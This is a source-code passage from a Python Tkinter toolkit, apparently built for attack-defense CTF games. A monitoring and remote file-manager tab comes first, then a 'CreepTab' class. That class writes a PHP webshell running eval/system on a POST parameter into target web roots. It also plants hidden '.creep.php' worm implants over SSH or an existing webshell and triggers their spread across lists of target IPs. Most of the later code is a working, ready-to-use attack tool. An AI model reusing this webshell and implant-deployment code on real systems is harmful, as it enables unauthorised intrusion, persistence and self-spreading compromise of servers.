                    self._monitor_after(stopper, 0, self._update_sys, d['sys'])
                self._monitor_after(stopper, 0, lambda t=d.get('time', ''): self.status_label.config(text=f'🟢 监控中 - {t}'))
            except urllib.error.HTTPError as e:
                self._monitor_after(stopper, 0, lambda c=e.code: self.status_label.config(text=f'⚠ HTTP {c}'))
            except urllib.error.URLError as e:
                self._monitor_after(stopper, 0, lambda r=e.reason: self.status_label.config(text=f'⚠ 连接失败: {r}'))
            except Exception as e:
                self._monitor_after(stopper, 0, lambda e=e: self.status_label.config(text=f'⚠ {e}'))
            stopper.wait(3.5)

    def _mon_search(self):
        kw = self.mon_search_var.get().strip()
        if not kw:
            return
        self.log_text.config(state=tk.NORMAL)
        self.log_text.tag_remove('search', '1.0', tk.END)
        self.log_text.tag_config('search', background='#e06c00', foreground='white')
        pos = '1.0'
        count = 0
        while True:
            pos = self.log_text.search(kw, pos, tk.END, nocase=True)
            if not pos:
                break
            end = f'{pos}+{len(kw)}c'
            self.log_text.tag_add('search', pos, end)
            pos = end
            count += 1
        self.log_text.config(state=tk.DISABLED)
        self.status_label.config(text=f'找到 {count} 处匹配')

    def _mon_clear_search(self):
        self.mon_search_var.set('')
        self.log_text.config(state=tk.NORMAL)
        self.log_text.tag_remove('search', '1.0', tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.status_label.config(text='搜索已清除')

    def add_lines(self, lines):
        added = 0
        with self._lock:
            seen = set(self.log_data)
            for line in reversed(lines):
                if not isinstance(line, str) or not line or line in seen:
                    continue
                seen.add(line)
                self.log_data.append(line)
                added += 1
                alert = '[ALERT]' in line or '[HIT]' in line
                self.new_alerts += int(alert)
                self.file_count += int(any((tag in line for tag in ('[NEW]', '[MOD]', '[DEL]'))))
                self.conn_count += int('[CONN]' in line or '[HIT]' in line)
                ips = re.findall('\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', line)
                if ips and alert:
                    self.track_attacker(ips[0])
            self.log_data = self.log_data[-2000:]
            size = len(self.log_data)
        if added:
            for key, value in [('file', self.file_count), ('conn', self.conn_count), ('alert', self.new_alerts), ('total', size)]:
                self.cards[key].config(text=str(value))
            self.refresh_log()

    def refresh_log(self):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete('1.0', tk.END)
        with self._lock:
            data = list(self.log_data)
        for line in reversed(data):
            timestamp, content = _split_monitor_line(line)
            self.log_text.insert(tk.END, timestamp + ' ', 'ts')
            tag = next((name for marker, name in [('[ALERT]', 'alert'), ('[NEW]', 'new'), ('[MOD]', 'mod'), ('[DEL]', 'del'), ('[HIT]', 'hit'), ('[SCAN]', 'scan'), ('[CONN]', 'conn')] if marker in content), 't')
            self.log_text.insert(tk.END, redact_secrets(content) + '\n', tag)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def clear_log(self):
        with self._lock:
            self.log_data.clear()
        self.file_count = 0
        self.conn_count = 0
        self.new_alerts = 0
        for k in ('file', 'conn', 'total', 'alert'):
            self.cards[k].config(text='0')
        self.refresh_log()

    def track_attacker(self, ip):
        now = datetime.now().strftime('%H:%M:%S')
        if ip not in self.atk_data:
            self.atk_data[ip] = {'count': 0, 'last': now}
        self.atk_data[ip]['count'] += 1
        self.atk_data[ip]['last'] = now
        self._check_alert_threshold()
        self._refresh_atk_tree()

    def _refresh_atk_tree(self):
        for i in self.atk_tree.get_children():
            self.atk_tree.delete(i)
        sorted_data = sorted(self.atk_data.items(), key=lambda x: -x[1]['count'])[:10]
        for rank, (ip, data) in enumerate(sorted_data, 1):
            self.atk_tree.insert('', tk.END, values=(rank, ip, data['count'], data.get('bad', 0), data['last']))
        self.lbl_atk_stat.config(text=f"总计 {sum((d['count'] for d in self.atk_data.values()))} 次请求")

    def _update_atk_server(self, atk):
        """服务端权威攻击统计 (5分钟窗口)"""
        with self._lock:
            self.atk_data.clear()
            for item in atk:
                if len(item) >= 4:
                    ip, c, s, ts = (item[0], item[1], item[2], item[3])
                else:
                    ip, c, s, ts = (item[0], item[1], 0, '')
                self.atk_data[ip] = {'count': int(c), 'bad': int(s), 'last': str(ts)}
        self._refresh_atk_tree()

    def _update_sys(self, sysd):
        txt = ''
        if 'load' in sysd and sysd['load']:
            txt += '系统负载: ' + sysd['load']
        if 'disk' in sysd and sysd['disk']:
            txt += ' | 磁盘已用: ' + sysd['disk']
        if 'proc' in sysd and sysd['proc']:
            txt += ' | 🚨 可疑进程!'
        if txt:
            self.lbl_atk_stat.config(text=txt)

    def clear_atk(self):
        self.atk_data.clear()
        self._refresh_atk_tree()

    def export_atk(self):
        p = filedialog.asksaveasfilename(defaultextension='.csv', initialfile='attackers.csv', filetypes=[('CSV', '*.csv')])
        if not p:
            return
        try:
            with open(p, 'w', encoding='utf-8-sig') as f:
                f.write('排名,IP,请求数,恶意/4xx,最后时间\n')
                for rank, (ip, data) in enumerate(sorted(self.atk_data.items(), key=lambda x: -x[1]['count']), 1):
                    f.write(f"{rank},{ip},{data['count']},{data.get('bad', 0)},{data['last']}\n")
            self.status_label.config(text=f'✅ 已导出 {p}')
        except Exception as e:
            messagebox.showerror('导出失败', str(e))

    def _check_alert_threshold(self):
        try:
            threshold = int(self.alert_threshold.get().strip() or 1)
        except Exception:
            threshold = 1
        now = time.time()
        self._alert_times.append(now)
        self._alert_times = [t for t in self._alert_times if now - t < 10]
        last = getattr(self, '_last_beep', 0)
        if len(self._alert_times) >= threshold and self.alert_sound.get() and (now - last >= 25):
            self._last_beep = now
            self.lbl_alert_status.config(text='🔔 🚨 告警触发! 检测到可疑攻击', foreground='#ff4d6d')
            try:
                import winsound
                winsound.MessageBeep(winsound.MB_ICONHAND)
            except Exception:
                try:
                    print('\x07', end='', flush=True)
                except Exception:
                    pass
        else:
            self.lbl_alert_status.config(text=f'🟢 当前频率: {len(self._alert_times)}/10s', foreground='#00ff9d')

    def export_log(self):
        path = filedialog.asksaveasfilename(defaultextension='.csv', filetypes=[('CSV', '*.csv'), ('Text', '*.txt')], initialfile='monitor_' + datetime.now().strftime('%Y%m%d_%H%M%S') + '.csv')
        if not path:
            return
        with self._lock:
            data = list(self.log_data)
        try:
            with open(path, 'w', encoding='utf-8-sig', newline='') as stream:
                if path.lower().endswith('.csv'):
                    writer = csv.writer(stream)
                    writer.writerow(['时间', '类型', '详情'])
                    for line in data:
                        timestamp, content = _split_monitor_line(line)
                        category = '文件' if any((tag in content for tag in ('[NEW]', '[MOD]', '[DEL]'))) else '连接'
                        writer.writerow([_csv_cell(timestamp), category, _csv_cell(redact_secrets(content))])
                else:
                    stream.write('\n'.join((redact_secrets(line) for line in data)))
            self.status_label.config(text='已导出')
        except OSError as exc:
            messagebox.showerror('导出失败', str(exc))

    def fm_base(self):
        return self.target_url.get().strip()

    def fm_req(self, action, params=None):
        import urllib.parse
        base = self.fm_base()
        pw = self.password.get().strip()
        url = f'{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=fm&action={action}'
        if params:
            url += '&' + urllib.parse.urlencode(params)
        try:
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(urllib.request.Request(url), timeout=15, context=ctx) as resp:
                return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            messagebox.showerror('错误', f'连接失败: {e}')
            return None

    def fm_post(self, action, data):
        import urllib.parse
        base = self.fm_base()
        pw = self.password.get().strip()
        url = f'{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=fm&action={action}'
        try:
            ctx = ssl._create_unverified_context()
            body = urllib.parse.urlencode(data).encode()
            req = urllib.request.Request(url, data=body)
            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
                return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            messagebox.showerror('错误', f'连接失败: {e}')
            return None

    def fm_search(self):
        kw = self.fm_search_var.get().strip()
        if not kw:
            messagebox.showwarning('提示', '请输入搜索关键字')
            return
        d = self.fm_req('search', {'kw': kw})
        if not d:
            return
        if d.get('error'):
            messagebox.showerror('搜索失败', d['error'])
            return
        self.fm_list.delete(0, tk.END)
        self.fm_search_items = []
        for f in d.get('items', []):
            icon = '📁' if f.get('d') else '📄'
            sz = f.get('s', 0)
            szs = f'{sz}B' if sz < 1024 else f'{sz / 1024:.1f}KB' if sz < 1048576 else f'{sz / 1048576:.1f}MB'
            self.fm_list.insert(tk.END, f"{icon} {f.get('n', '')}  ({szs})")
            self.fm_search_items.append((f.get('n', ''), bool(f.get('d'))))
        self.fm_search_mode = True
        self.fm_status.config(text=f"🔎 搜索『{kw}』: {d.get('found', len(self.fm_search_items))} 个结果 (双击文件打开/目录跳转)")

    def fm_clear_search(self):
        self.fm_search_var.set('')
        self.fm_search_mode = False
        self.fm_search_items = []
        self.fm_status.config(text='')
        self.fm_refresh()

    def fm_refresh(self):
        self.fm_search_mode = False
        self.fm_search_items = []
        d = self.fm_req('list', {'dir': self.fm_path.get()})
        if not d:
            return
        self.fm_list.delete(0, tk.END)
        if d.get('error'):
            self.fm_list.insert(tk.END, f"[错误] {d['error']}")
            return
        for f in d.get('items', []):
            icon = '📁' if f.get('d') else '📄'
            sz = f.get('s', 0)
            szs = f'{sz}B' if sz < 1024 else f'{sz / 1024:.1f}KB' if sz < 1048576 else f'{sz / 1048576:.1f}MB'
            self.fm_list.insert(tk.END, f"{icon} {f.get('n', '')}  ({szs})")
        self.fm_path.set(d.get('path', '/'))

    def fm_double_click(self, event):
        sel = self.fm_list.curselection()
        if not sel:
            return
        is_search = getattr(self, 'fm_search_mode', False)
        if is_search:
            if sel[0] < len(self.fm_search_items):
                rel, is_dir = self.fm_search_items[sel[0]]
                if is_dir:
                    self.fm_path.set('/' + rel.strip('/') if rel.strip('/') else '/')
                    self.fm_clear_search()
                else:
                    self.fm_edit_file()
            return
        txt = self.fm_list.get(sel[0])
        name = txt.rsplit('  (', 1)[0][2:]
        if txt.startswith('📁'):
            self.fm_path.set(self.fm_path.get().rstrip('/') + '/' + name)
            self.fm_refresh()
        else:
            self.fm_edit_file()

    def fm_go_up(self):
        if getattr(self, 'fm_search_mode', False):
            self.fm_clear_search()
            return
        path = self.fm_path.get().strip()
        if not path or path == '/':
            return
        p = path.rstrip('/')
        parent = p[:p.rfind('/')] if '/' in p else ''
        self.fm_path.set(parent or '/')
        self.fm_refresh()

    def fm_edit_file(self):
        sel = self.fm_list.curselection()
        if not sel:
            return
        txt = self.fm_list.get(sel[0])
        name = ''
        if txt.startswith('📁'):
            return
        if getattr(self, 'fm_search_mode', False):
            rel, is_dir = self.fm_search_items[sel[0]] if sel[0] < len(self.fm_search_items) else ('', False)
            if is_dir:
                return
            path = '/' + rel.strip('/')
        else:
            name = txt.rsplit('  (', 1)[0][2:]
            path = self.fm_path.get().rstrip('/') + '/' + name
        d = self.fm_req('read', {'file': path})
        if not d or d.get('error'):
            return
        self.fm_edit_title.config(text=f"✏️ {d.get('name', name)}")
        self.fm_edit_box.delete('1.0', tk.END)
        self.fm_edit_box.insert(tk.END, d.get('content', ''))
        self.fm_editor.pack(fill=tk.BOTH, pady=(4, 0))
        self.fm_cur_edit = path

    def fm_save_file(self):
        if not hasattr(self, 'fm_cur_edit') or not self.fm_cur_edit:
            return
        content = self.fm_edit_box.get('1.0', tk.END).rstrip('\n')
        d = self.fm_post('save', {'file': self.fm_cur_edit, 'content': content})
        if d and d.get('ok'):
            self.fm_close_editor()
            self.fm_refresh()

    def fm_close_editor(self):
        self.fm_editor.pack_forget()
        if hasattr(self, 'fm_cur_edit'):
            del self.fm_cur_edit

    def fm_delete_file(self):
        sel = self.fm_list.curselection()
        if not sel:
            return
        txt = self.fm_list.get(sel[0])
        name = txt.rsplit('  (', 1)[0][2:]
        if getattr(self, 'fm_search_mode', False):
            rel, is_dir = self.fm_search_items[sel[0]] if sel[0] < len(self.fm_search_items) else ('', False)
            name = rel.rsplit('/', 1)[-1]
            path = '/' + rel.strip('/')
        else:
            path = self.fm_path.get().rstrip('/') + '/' + name
        if not messagebox.askyesno('确认', f'确定删除 {name}？'):
            return
        d = self.fm_req('delete', {'file': path})
        if d and d.get('ok'):
            self.fm_clear_search()

    def fm_download(self):
        sel = self.fm_list.curselection()
        if not sel:
            return
        txt = self.fm_list.get(sel[0])
        if txt.startswith('📁'):
            return
        if getattr(self, 'fm_search_mode', False):
            rel, is_dir = self.fm_search_items[sel[0]] if sel[0] < len(self.fm_search_items) else ('', False)
            if is_dir:
                return
            name = rel.rsplit('/', 1)[-1]
            path = '/' + rel.strip('/')
        else:
            name = txt.rsplit('  (', 1)[0][2:]
            path = self.fm_path.get().rstrip('/') + '/' + name
        p = filedialog.asksaveasfilename(initialfile=name, defaultextension='')
        if not p:
            return
        import urllib.parse
        base = self.fm_base()
        pw = self.password.get().strip()
        url = f'{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=fm&action=read&file={urllib.parse.quote(path)}'
        try:
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(urllib.request.Request(url), timeout=15, context=ctx) as resp:
                d = json.loads(resp.read().decode('utf-8'))
                if d.get('content') is not None:
                    with open(p, 'w', encoding='utf-8') as f:
                        f.write(d['content'])
                    messagebox.showinfo('完成', f'已下载到 {p}')
        except Exception as e:
            messagebox.showerror('错误', str(e))

    def fm_upload_file(self):
        p = filedialog.askopenfilename()
        if not p:
            return
        import urllib.parse
        base = self.fm_base()
        pw = self.password.get().strip()
        url = f'{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=fm&action=upload'
        try:
            import requests
            with open(p, 'rb') as f:
                r = requests.post(url, files={'f': (os.path.basename(p), f)}, data={'dir': self.fm_path.get()}, timeout=15, verify=False)
                d = r.json()
                if d.get('ok'):
                    self.fm_refresh()
                else:
                    messagebox.showerror('错误', d.get('error', '上传失败'))
        except Exception as e:
            messagebox.showerror('上传错误', str(e))

    def fm_mkdir(self):
        name = tk.simpledialog.askstring('新建目录', '目录名:')
        if not name:
            return
        d = self.fm_req('mkdir', {'dir': self.fm_path.get(), 'name': name})
        if d and d.get('ok'):
            self.fm_refresh()

    def _domain_init(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.target_url = StateValue(value='http://127.0.0.1:8090/target_monitor.php')
        self.password = StateValue(value='cmd')
        self.monitoring = False
        self.log_data = []
        self.last_json_hash = ''
        self.new_alerts = 0
        self.file_count = 0
        self.conn_count = 0
        self._lock = threading.Lock()
        self.cfg_file = os.path.join(CONFIG_DIR, 'monitor_config.json')
        self.load_config()
    _fields = {'target_url': {'kind': 'value', 'default': 'http://127.0.0.1:8090/target_monitor.php'}, 'password': {'kind': 'value', 'default': 'cmd'}, 'monitoring': {'kind': 'literal', 'default': False}, 'log_data': {'kind': 'literal', 'default': []}, 'last_json_hash': {'kind': 'literal', 'default': ''}, 'new_alerts': {'kind': 'literal', 'default': 0}, 'file_count': {'kind': 'literal', 'default': 0}, 'conn_count': {'kind': 'literal', 'default': 0}, '_lock': {'kind': 'lock'}, 'e_url': {'kind': 'value', 'default': ''}, 'e_pw': {'kind': 'value', 'default': ''}, 'cards': {'kind': 'literal', 'default': {}}, 'mon_search_var': {'kind': 'value', 'default': ''}, 'log_text': {'kind': 'text', 'default': ''}, 'atk_tree': {'kind': 'table'}, 'atk_data': {'kind': 'literal', 'default': {}}, 'alert_sound': {'kind': 'value', 'default': True}, 'alert_threshold': {'kind': 'value', 'default': '1'}, '_alert_times': {'kind': 'literal', 'default': []}, 'fm_path': {'kind': 'value', 'default': '/'}, 'fm_search_var': {'kind': 'value', 'default': ''}, 'fm_search_entry': {'kind': 'value', 'default': ''}, 'fm_search_mode': {'kind': 'literal', 'default': False}, 'fm_search_items': {'kind': 'literal', 'default': []}, 'fm_list': {'kind': 'list'}, 'fm_edit_box': {'kind': 'text', 'default': ''}, '_deploy_vars': {'kind': 'literal', 'default': {}}, '_monitor_stop': {'kind': 'event'}, 'parent': {'kind': 'value', 'default': ''}, 'log': {'kind': 'value', 'default': ''}, 'cfg_file': {'kind': 'value', 'default': ''}, 'btn_start_mon': {'kind': 'value', 'default': ''}, 'btn_export_mon': {'kind': 'value', 'default': ''}, 'btn_clear_mon': {'kind': 'value', 'default': ''}, 'status_label': {'kind': 'value', 'default': ''}, 'mon_log_frame': {'kind': 'value', 'default': ''}, 'lbl_atk_stat': {'kind': 'value', 'default': ''}, 'lbl_alert_status': {'kind': 'value', 'default': ''}, 'fm_status': {'kind': 'value', 'default': ''}, 'fm_editor': {'kind': 'value', 'default': ''}, 'fm_edit_title': {'kind': 'value', 'default': ''}, 'fm_cur_edit': {'kind': 'value', 'default': ''}, '_last_beep': {'kind': 'value', 'default': ''}, 'root': {'kind': 'value', 'default': ''}, '_last_success': {'kind': 'value', 'default': ''}}
CREEP_DIR = os.path.join(BASE, '上传靶机')

class CreepTab(ActorState):

    def cfg_vals(self):
        return {'ips': self.e_ip.get().strip(), 'port': int(self.e_port.get() or 80), 'https': self.v_https.get(), 'shell_url': self.e_surl.get().strip() or '/shell.php', 'shell_pass': self.e_spass.get().strip() or 'cmd', 'password': self.e_cpass.get().strip() or 'cmd', 'timeout': int(self.e_to.get() or 10), 'shell_func': self.shell_func.get(), 'shell_method': self.shell_method.get(), 'web_root': self.e_webroot.get().strip() or '/var/www/html', 'worm_type': self.worm_type.get() if hasattr(self, 'worm_type') else 'creep', 'worm_key': self.worm_key.get().strip() if hasattr(self, 'worm_key') else 'ylphantom', 'conn_mode': self.creep_conn_mode.get() if hasattr(self, 'creep_conn_mode') else 'webshell', 'ssh_host': self.e_creep_ssh_host.get().strip() if hasattr(self, 'e_creep_ssh_host') else '', 'ssh_port': int(self.e_creep_ssh_port.get() or 22) if hasattr(self, 'e_creep_ssh_port') else 22, 'ssh_user': self.e_creep_ssh_user.get().strip() if hasattr(self, 'e_creep_ssh_user') else 'root', 'ssh_pass': self.e_creep_ssh_pass.get().strip() if hasattr(self, 'e_creep_ssh_pass') else '', 'ssh_webdir': self.e_creep_ssh_webdir.get().strip() if hasattr(self, 'e_creep_ssh_webdir') else ''}

    def _shell_req(self, s, base, c, cmd):
        method = c.get('shell_method', 'post').lower()
        if method == 'get':
            return s.get(f"{base}{c['shell_url']}", params={c['shell_pass']: cmd}, timeout=c['timeout'])
        return s.post(f"{base}{c['shell_url']}", data={c['shell_pass']: cmd}, timeout=c['timeout'])

    def save_cfg(self):
        c = self.cfg_vals()
        try:
            atomic_write(self.cfg_file, json.dumps({'ip': c['ips'], 'port': c['port'], 'https': c['https'], 'shell_url': c['shell_url'], 'shell_pass': c['shell_pass'], 'password': c['password'], 'web_root': c['web_root']}, indent=2))
        except Exception:
            pass

    def log_self(self, msg, tag='info'):
        self.log_w.log(msg, tag)

    def _hp(self, ip, c):
        """解析 ip:端口 格式，返回 (host, web_port)"""
        host = str(ip).strip()
        port = c.get('port', 80)
        if ':' in host:
            hp = host.rsplit(':', 1)
            if len(hp) == 2 and hp[1].isdigit():
                return (hp[0], int(hp[1]))
        return (host, port)

    def ssh_deploy_creep(self):
        """一键部署木马：有SSH就用SSH，没SSH就用Webshell"""

        def do_deploy(vals):
            host, port, user, pwd = (vals['host'], vals['port'], vals['user'], vals['pwd'])
            sh_pass = vals.get('sh_pass', 'pass')
            sh_url = vals.get('sh_url', '/web/shell.php')

            def _deploy():
                try:
                    import requests, base64
                    creep_php = os.path.join(BASE, '上传靶机', '.creep.php')
                    creep_dat = os.path.join(BASE, '上传靶机', '.creep.dat')
                    if not os.path.exists(creep_php):
                        self.root.after(0, lambda: self.log_self(f'[FAIL] 找不到 .creep.php', 'fail'))
                        return
                    if host and pwd:
                        import paramiko
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                        sftp = ssh.open_sftp()
                        webdir = (self.e_webroot.get().strip() or '/var/www/html').strip('/')
                        if not webdir or webdir == '/var/www/html':
                            try:
                                detect_cmd = 'for d in /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d "$d" ] && echo "$d" && break; done'
                                _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                                so.channel.settimeout(10)
                                out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                                if out and out[0].strip():
                                    webdir = out[0].strip().rstrip('/')
                            except Exception:
                                pass
                        sftp.put(creep_php, f'{webdir}/.creep.php')
                        sftp.put(creep_dat, f'{webdir}/.creep.dat')
                        sftp.open(f'{webdir}/shell.php', 'w').write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                        sftp.close()
                        ssh.close()
                        self.root.after(0, lambda: self.log_self('[OK] SSH部署+Webshell创建成功', 'ok'))
                    else:
                        with open(creep_php, 'rb') as f:
                            b64 = base64.b64encode(f.read()).decode()
                        with open(creep_dat, 'rb') as f:
                            b64_dat = base64.b64encode(f.read()).decode()
                        base_url = make_base(self.e_ip.get().strip(), int(self.e_port.get() or 80), False)
                        r = requests.post(base_url + sh_url, data={sh_pass: f"file_put_contents('.creep.php', base64_decode('{b64}'));"}, timeout=10)
                        r = requests.post(base_url + sh_url, data={sh_pass: f"file_put_contents('.creep.dat', base64_decode('{b64_dat}'));"}, timeout=10)
                        self.root.after(0, lambda: self.log_self('[OK] WebShell部署木马成功', 'ok'))
                    self.root.after(0, lambda: (self.e_surl.delete(0, tk.END), self.e_surl.insert(0, sh_url), self.e_spass.delete(0, tk.END), self.e_spass.insert(0, sh_pass)))
                except Exception as e:
                    self.root.after(0, lambda e=e: self.log_self(f'[FAIL] {e}', 'fail'))
            async_run(_deploy)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        ssh_deploy_dialog(self.parent, '🚀 一键部署木马', '有SSH填SSH，没SSH填Webshell路径+密码', [('SSH地址:', 'host', pre.get('host', ''), ''), ('SSH端口:', 'port', pre.get('port', '22'), ''), ('用户名:', 'user', pre.get('user', 'root'), ''), ('密码:', 'pwd', pre.get('pwd', ''), '*'), ('Shell路径:', 'sh_url', '/web/shell.php', ''), ('Shell密码:', 'sh_pass', 'pass', '')], do_deploy)

    def _switch_creep_mode(self):
        if self.creep_conn_mode.get() == 'ssh':
            self.ws_frame.pack_forget()
            self.ssh_frame.pack(fill=tk.X, pady=2)
        else:
            self.ssh_frame.pack_forget()
            self.ws_frame.pack(fill=tk.X, pady=2)

    def set_btns(self, enabled):
        st = tk.NORMAL if enabled else tk.DISABLED
        for b in (self.btn_implant, self.btn_dep, self.btn_spread, self.btn_check, self.btn_kill, self.btn_exec):
            b.config(state=st)

    def get_targets(self):
        raw = self.e_ip.get().strip()
        if not raw:
            messagebox.showwarning('警告', '请先输入目标IP')
            return []
        return parse_targets(raw)

    def do_implant(self):
        ips = self.get_targets()
        if not ips:
            return
        self.set_btns(False)
        self.save_cfg()
        self.log_self('=' * 50, 'warn')
        self.log_self('>>> 🔥 一键植入蠕虫不死马', 'warn')
        self.log_self('=' * 50, 'warn')
        c = self.cfg_vals()

        def run():
            ok = fail = 0
            with ThreadPoolExecutor(max_workers=min(10, len(ips))) as ex:
                fs = {ex.submit(self.implant_one, ip, c): ip for ip in ips}
                for f in as_completed(fs):
                    ip, succ, msg = f.result()
                    self.log_self(f"  {('[OK]' if succ else '[FAIL]')} {ip}: {msg}", 'ok' if succ else 'fail')
                    ok += succ
                    fail += not succ
            self.log_self(f'一键植入完成: {ok}成功 {fail}失败', 'ok' if ok >= fail else 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        async_run(run)

    def _bases_for(self, ip, c):
        host, port = self._hp(ip, c)
        b1 = make_base(host, port, bool(c.get('https')))
        b2 = make_base(host, port, not bool(c.get('https')))
        return [b1, b2] if b1 != b2 else [b1]

    def implant_one(self, ip, c):
        try:
            php_path = os.path.join(CREEP_DIR, '.creep.php')
            dat_path = os.path.join(CREEP_DIR, '.creep.dat')
            if not os.path.exists(php_path):
                return (ip, False, f'文件不存在: {php_path}')
            if not os.path.exists(dat_path):
                return (ip, False, f'文件不存在: {dat_path}')
            with open(php_path, 'rb') as f:
                php = f.read()
            with open(dat_path, 'rb') as f:
                dat = f.read()
            b64_php = base64.b64encode(php).decode()
            b64_dat = base64.b64encode(dat).decode()
            host, web_port = self._hp(ip, c)
            ssh_host = c.get('ssh_host', '').strip()
            conn_mode = c.get('conn_mode', 'webshell')
            use_ssh = conn_mode == 'ssh' and bool(ssh_host)
            if use_ssh:
                web_root = (c.get('ssh_webdir') or c.get('web_root') or '/var/www/html').strip('/')
            else:
                web_root = (c.get('web_root') or '/var/www/html').strip('/')
            self.log_self(f"[DEBUG] 模式={('SSH' if use_ssh else 'WebShell')} 目标={ssh_host or host}:{(c.get('ssh_port', 22) if use_ssh else web_port)} Web目录=/{web_root} Web端口={web_port}", 'info')
            if use_ssh:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ssh_host or host, port=c.get('ssh_port', 22), username=c.get('ssh_user', 'root'), password=c.get('ssh_pass', ''), timeout=c.get('timeout', 10))
                try:
                    for fname, b64 in [('.creep.php', b64_php), ('.creep.dat', b64_dat)]:
                        target = f"{web_root.rstrip('/')}/{fname}"
                        cmd = f"mkdir -p {web_root} && echo '{b64}' | base64 -d > {target} && echo W_OK"
                        stdin, stdout, stderr = ssh.exec_command(cmd)
                        rc = stdout.channel.recv_exit_status()
                        out = (stdout.read().decode(errors='ignore') or '').strip()
                        errmsg = (stderr.read().decode(errors='ignore') or '').strip()
                        if rc != 0 or 'W_OK' not in out:
                            return (ip, False, f"写入{fname}失败: {errmsg[:40] or out[:40] or '未知错误'}")
                    verify_path = f"{web_root.rstrip('/')}/.creep.php"
                    cmd3 = f"ls -la {verify_path} {web_root.rstrip('/')}/.creep.dat"
                    stdin, stdout, stderr = ssh.exec_command(cmd3)
                    listing = (stdout.read().decode(errors='ignore') or '').strip()
                    self.log_self(f'[SSH] 文件确认:\n{listing}', 'info')
                finally:
                    ssh.close()
                try:
                    base = make_base(host, web_port, c['https'])
                    r = requests.get(f'{base}/.creep.php', headers={'X-Creep': c['password'], 'X-Spread': '1'}, timeout=min(c['timeout'], 8))
                    htip = f'HTTP访问: {r.status_code}' if r.status_code != 200 else f'HTTP访问OK: {r.text.strip()[:20]}'
                except Exception as e:
                    htip = f'HTTP访问失败(不影响SSH植入): {str(e)[:40]}'
                return (host, True, f'SSH植入成功 | {htip}')
            err = None
            for base in self._bases_for(ip, c):
                try:
                    s = _session()
                    for fname, b64data in [('.creep.php', b64_php), ('.creep.dat', b64_dat)]:
                        wpath = f'/{web_root}/{fname}'
                        cmd = f"system('echo {b64data} | base64 -d > {wpath}');"
                        r = s.post(f"{base}{c['shell_url']}", data={c['shell_pass']: cmd}, timeout=c['timeout'])
                        if r.status_code != 200:
                            return (ip, False, f'WebShell写入{fname}失败: HTTP{r.status_code}')
                        time.sleep(0.05)
                    time.sleep(0.3)
                    vr = s.post(f"{base}{c['shell_url']}", data={c['shell_pass']: f"echo file_exists('/{web_root}/.creep.php')&&file_exists('/{web_root}/.creep.dat')?'W_OK':'W_FAIL';"}, timeout=c['timeout'])
                    if 'W_OK' not in vr.text:
                        return (ip, False, f"写入验证失败: {vr.text.strip()[:40] or '空响应(Shell密码/路径不对?)'}")
                    r1 = requests.get(f'{base}/.creep.php', headers={'X-Creep': c['password'], 'X-Spread': '1'}, timeout=c['timeout'])
                    r2 = requests.get(f'{base}/.creep.php', headers={'X-Creep': c['password'], 'X-Worm': '1'}, timeout=c['timeout'])
                    res1 = r1.text.strip()[:20] if r1.status_code == 200 else f'HTTP{r1.status_code}'
                    res2 = r2.text.strip()[:20] if r2.status_code == 200 else f'HTTP{r2.status_code}'
                    if not res1:
                        res1 = '(空:蠕虫密码不匹配或30秒锁)'
                    if not res2:
                        res2 = '(空:蠕虫密码不匹配)'
                    tag = ' (https降级)' if base.startswith('https') and (not c.get('https')) else ''
                    return (ip, True, f'部署OK{tag} | 扩散:{res1} | 蠕虫:{res2}')
                except Exception as e:
                    err = e
            return (ip, False, str(err)[:60])
        except Exception as e:
            return (ip, False, str(e)[:60])

    def deploy_one(self, ip, c):
        try:
            php_path = os.path.join(CREEP_DIR, '.creep.php')
            dat_path = os.path.join(CREEP_DIR, '.creep.dat')
            if not os.path.exists(php_path):
                return (ip, False, f'文件不存在: {php_path}')
            if not os.path.exists(dat_path):
                return (ip, False, f'文件不存在: {dat_path}')
            with open(php_path, 'rb') as f:
                php = f.read()
            with open(dat_path, 'rb') as f:
                dat = f.read()
            b64_php = base64.b64encode(php).decode()
            b64_dat = base64.b64encode(dat).decode()
            conn_mode = c.get('conn_mode', 'webshell')
            host, web_port = self._hp(ip, c)
            ssh_host = c.get('ssh_host', '').strip()
            use_ssh = conn_mode == 'ssh' and bool(ssh_host)
            if use_ssh:
                web_root = (c.get('ssh_webdir') or c.get('web_root') or '/var/www/html').strip('/')
            else:
                web_root = (c.get('web_root') or '/var/www/html').strip('/')
            if use_ssh:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ssh_host or host, port=c.get('ssh_port', 22), username=c.get('ssh_user', 'root'), password=c.get('ssh_pass', ''), timeout=c.get('timeout', 10))
                cmd1 = f"mkdir -p {web_root} && echo '{b64_php}' | base64 -d > {web_root.rstrip('/')}/.creep.php"
                stdin, stdout, stderr = ssh.exec_command(cmd1)
                if stdout.channel.recv_exit_status() != 0:
                    return (ip, False, f"写入.php失败: {(stderr.read().decode(errors='ignore') or '')[:50]}")
                cmd2 = f"echo '{b64_dat}' | base64 -d > {web_root.rstrip('/')}/.creep.dat"
